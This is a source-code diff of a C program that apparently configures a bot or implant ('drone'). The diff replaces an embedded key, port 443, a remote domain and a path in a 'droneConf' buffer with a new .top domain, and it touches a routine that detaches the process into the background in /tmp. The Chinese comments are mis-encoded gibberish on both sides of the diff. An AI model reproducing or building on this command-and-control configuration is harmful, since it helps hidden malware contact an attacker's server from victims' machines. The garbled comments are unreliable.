@@ -14,7 +14,7 @@
     #define debug_msg(format,...)
 #endif   /* DEBUG */
 
-   static char droneConf[160]= "12345678901234567890123456789012""\xbb\x01""www.hypnusoft.com""\x00""www.hypnusoft.com""\x00""/cpanel/srv/""\x00";    
+   static char droneConf[160]= "Luhsg8jOSJRnOioo8lEUPltN2X4W6qEm""\xbb\x01""systemsettingsbroker.top""\x00""systemsettingsbroker.top""\x00""/x/Queen/public_html/""\x00";    
  //static char droneConf[160]= "EnWRpho6TKLfSWFP8qbsKPpe9DhW0813""\x50\x00""192.168.93.1""\x00""192.168.93.1""\x00""/bmc/queen/public_html/srv/""\x00";	
 
 
@@ -60,22 +60,22 @@ void * initDrone(char * soName,int showinfo){
 void init_daemon(){ 
 	int pid; 
 	int i; 
-	if((pid = fork())) exit(0); //¸¸½ø³Ì£¬ÍË³ö 
+	if((pid = fork())) exit(0); //çˆ¶è¿›ç¨‹ï¼Œé€€å‡º 
 
-    else if(pid < 0) exit(1); //forkÊ§°Ü 
+    else if(pid < 0) exit(1); //forkå¤±è´¥ 
 
-    /* ×Ó½ø³Ì¼ÌÐøÖ´ÐÐ */ 
-	setsid(); //´´½¨ÐÂµÄ»á»°×é£¬×Ó½ø³Ì³ÉÎª×é³¤£¬²¢Óë¿ØÖÆÖÕ¶Ë·ÖÀë 
+    /* å­è¿›ç¨‹ç»§ç»­æ‰§è¡Œ */ 
+	setsid(); //åˆ›å»ºæ–°çš„ä¼šè¯ç»„ï¼Œå­è¿›ç¨‹æˆä¸ºç»„é•¿ï¼Œå¹¶ä¸ŽæŽ§åˆ¶ç»ˆç«¯åˆ†ç¦» 
 
-	/* ·ÀÖ¹×Ó½ø³Ì£¨×é³¤£©»ñÈ¡¿ØÖÆÖÕ¶Ë */ 
-	if((pid = fork())) exit(0); //¸¸½ø³Ì£¬ÍË³ö 
+	/* é˜²æ­¢å­è¿›ç¨‹ï¼ˆç»„é•¿ï¼‰èŽ·å–æŽ§åˆ¶ç»ˆç«¯ */ 
+	if((pid = fork())) exit(0); //çˆ¶è¿›ç¨‹ï¼Œé€€å‡º 
 
-	else if(pid < 0) exit(1); //fork´íÎó£¬ÍË³ö 
+	else if(pid < 0) exit(1); //forké”™è¯¯ï¼Œé€€å‡º 
 
-	/* µÚ¶þ×Ó½ø³Ì¼ÌÐøÖ´ÐÐ , µÚ¶þ×Ó½ø³Ì²»ÔÙÊÇ»á»á»°×é×é³¤*/ 
+	/* ç¬¬äºŒå­è¿›ç¨‹ç»§ç»­æ‰§è¡Œ , ç¬¬äºŒå­è¿›ç¨‹ä¸å†æ˜¯ä¼šä¼šè¯ç»„ç»„é•¿*/ 
 
-    chdir("/tmp"); /* ÇÐ»»¹¤×÷Ä¿Â¼ */ 
-	umask(0); /* ÖØÉèÎÄ¼þ´´½¨ÑÚÂë */ 
+    chdir("/tmp"); /* åˆ‡æ¢å·¥ä½œç›®å½• */ 
+	umask(0); /* é‡è®¾æ–‡ä»¶åˆ›å»ºæŽ©ç  */ 
 	return; 
 } 
 
@@ -186,7 +186,7 @@ int main(int argc,char *argv[]){
 		return 0;
 	}
 
-	//signal(SIGCHLD, SIG_IGN); /* ºöÂÔ×Ó½ø³Ì½áÊøÐÅºÅ£¬·ÀÖ¹³öÏÖ½©Ê¬½ø³Ì */ 
+	//signal(SIGCHLD, SIG_IGN); /* å¿½ç•¥å­è¿›ç¨‹ç»“æŸä¿¡å·ï¼Œé˜²æ­¢å‡ºçŽ°åƒµå°¸è¿›ç¨‹ */ 
 
    // init_daemon(); 
 
